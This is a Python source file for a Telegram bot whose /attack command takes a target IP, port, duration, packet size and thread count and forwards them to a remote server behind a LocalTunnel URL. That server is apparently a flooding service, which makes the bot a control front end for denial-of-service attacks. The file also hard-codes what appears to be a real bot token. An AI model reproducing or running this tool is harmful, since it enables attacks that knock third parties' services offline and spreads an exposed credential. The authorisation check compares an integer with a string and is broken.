import asyncio
import json
import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from telegram.error import TelegramError

TELEGRAM_BOT_TOKEN = '7642417497:AAGPamqcy9UQ7FhDNHYbLcfBqCeEcEk2IjE'
ALLOWED_USER_ID = '7533233807'  # Owner ID who is authorized

# Replace with the LocalTunnel URL provided by your server script
LOCALTUNNEL_URL = "https://two-pets-punch.loca.lt/attack"

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Welcome to the battlefield! 🔥*\n\n"
        "*Use /attack <ip> <port> <time> <packet_size> <threads>*\n"
        "*Let the war begin! ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the ID of the user issuing the command

    # Check if the user is allowed to use the bot
    if user_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 5:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <time> <packet_size> <threads>*", parse_mode='Markdown')
        return

    ip, port, time_duration, packet_size, threads = args

    # Construct the payload for the server
    payload = {
        "ip": ip,
        "port": port,
        "time": time_duration,
        "packet_size": packet_size,
        "threads": threads
    }

    try:
        # Send the payload to the server using the LocalTunnel URL
        response = requests.post(LOCALTUNNEL_URL, json=payload)

        # Check if the response is successful
        if response.status_code == 200:
            data = response.json()
            status = data.get("status")
            output = data.get("output", "")
            error = data.get("error", "")
            await context.bot.send_message(chat_id=chat_id, text=f"*⚔️ Attack Launched! ⚔️*\nStatus: {status}\nOutput: {output}\nError: {error}", parse_mode='Markdown')
        else:
            await context.bot.send_message(chat_id=chat_id, text="*❌ Failed to launch attack. Please check the server.*", parse_mode='Markdown')
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error: {str(e)}*", parse_mode='Markdown')

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))

    # Application run polling, job queue automatically will trigger background tasks
    application.run_polling()

if __name__ == '__main__':
    main()
    